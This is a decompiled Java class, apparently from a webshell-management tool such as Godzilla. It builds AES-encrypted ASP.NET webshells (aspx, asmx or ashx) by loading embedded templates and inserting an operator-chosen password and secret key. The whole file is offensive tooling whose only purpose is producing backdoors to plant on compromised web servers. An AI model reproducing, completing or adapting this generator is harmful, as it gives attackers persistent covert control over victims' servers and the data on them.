//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.cshapAes;

import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.io.InputStream;
import javax.swing.Icon;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"aspx", "asmx", "ashx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey,boolean isBin,String className) {
        byte[] data = null;
        InputStream inputStream = null;
        try {
            if (className.length() > 20) {
                inputStream = shells.cryptions.cshapAes.Generate.class.getResourceAsStream("template/" + className + ".bin");
                System.out.println(className);
            }
            else{
                System.out.println("className");
                //InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw.bin" : "base64.bin"));
                inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw.bin" : "base64.bin"));

            }
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                template = template.replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception var10) {
            Log.error(var10);
        }

        return data;
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin,String className) {
        return GenerateShellLoder("", pass, secretKey,false,className);}

    public static byte[] GenerateShellLoderByAsmx(String shellName, String pass, String secretKey) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + "shellAsmx.asmx");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            return code.getBytes();
        } catch (Exception var6) {
            Log.error(var6);
            return (byte[])data;
        }
    }

    public static byte[] GenerateShellLoderByAsmx(String pass, String secretKey) {
        return GenerateShellLoderByAsmx("", pass, secretKey);
    }
}